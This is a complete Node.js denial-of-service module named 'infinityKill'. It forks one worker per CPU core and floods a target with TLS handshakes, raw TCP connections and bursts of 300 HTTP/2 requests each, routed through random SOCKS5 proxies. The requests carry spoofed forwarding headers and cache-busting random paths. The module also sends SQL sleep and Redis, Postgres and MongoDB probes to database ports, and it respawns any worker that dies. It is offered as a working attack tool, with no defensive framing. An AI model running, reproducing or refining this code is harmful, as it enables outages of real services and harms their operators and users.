const cluster = require('cluster');
const os      = require('os');
const http2   = require('http2-wrapper');
const tls     = require('tls');
const net     = require('net');
const fs      = require('fs');
const { SocksProxyAgent } = require('socks-proxy-agent');

const proxies = fs.readFileSync('./proxy.txt','utf8').split(/\r?\n/).filter(Boolean);
const randProxy=()=>proxies[Math.floor(Math.random()*proxies.length)];
const randIP  =()=>`${R(11,255)}.${R(0,255)}.${R(0,255)}.${R(2,254)}`;
const R=(min,max)=>Math.floor(Math.random()*(max-min+1))+min;

function workerJob(ip, hostHeader, duration){
  const end = Date.now() + duration*1000;

  (function cpuLoop(){
    if(Date.now() > end) return;
    const socket = tls.connect({
      host: ip, port: 443, servername: hostHeader, rejectUnauthorized: false,
      ciphers: 'AES256-GCM-SHA384:AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384'
    }, ()=>{ socket.end(); });
    socket.on('error',()=>{});
    setImmediate(cpuLoop);
  })();

  (function ioLoop(){
    if(Date.now() > end) return;
    const agent = new SocksProxyAgent(`socks5://${randProxy()}`);
    const client = http2.connect(`https://${hostHeader}:443`, {agent, settings:{maxConcurrentStreams: 300}});
    for(let i=0;i<300;i++){
      const req = client.request({
        ':path':`/search?q=${randIP()}&rand=${Math.random().toString(36).substr(2,9)}`,
        ':method':'GET',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/12'+R(0,9)+'.0.'+R(1000,9999)+'.'+R(10,99)+' Safari/537.36',
        'x-forwarded-for': randIP(),
        'x-real-ip': randIP(),
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'cache-control': 'no-cache'
      });
      req.on('response', ()=> req.close());
      req.on('error', ()=>{});
      req.end();
    }
    client.close();
    setImmediate(ioLoop);
  })();

  (function tcpLoop(){
    if(Date.now() > end) return;
    const s = net.connect({host: ip, port: 443, timeout: 100}, ()=>{ s.end(); });
    s.on('error',()=>{});
    setImmediate(tcpLoop);
  })();

  (function dbLoop(){
    if(Date.now() > end) return;
    const payloads = [`SELECT SLEEP(3); -- `,`PING\r\n`,`GET /bigkey\r\n`,`SHOW PROCESSLIST;`];
    const ports    = [3306, 6379, 5432, 27017];
    ports.forEach(p=>{
      payloads.forEach(pl=>{
        const s = net.connect({host: ip, port: p, timeout: 500}, ()=>{ s.write(pl); s.end(); });
        s.on('error',()=>{});
      });
    });
    setTimeout(dbLoop, 200); 
  })();
}

function infinityKill(ip, hostHeader, duration) {
  if(cluster.isWorker) {
    workerJob(ip, hostHeader, duration);
    return;
  }
  console.log(`[Infinity] Spawning ${os.cpus().length} workers…`);
  for(let i=0;i<os.cpus().length;i++) cluster.fork();
  cluster.on('exit',(worker,code)=>{ if(code!==0) cluster.fork(); });
}

module.exports = { infinityKill };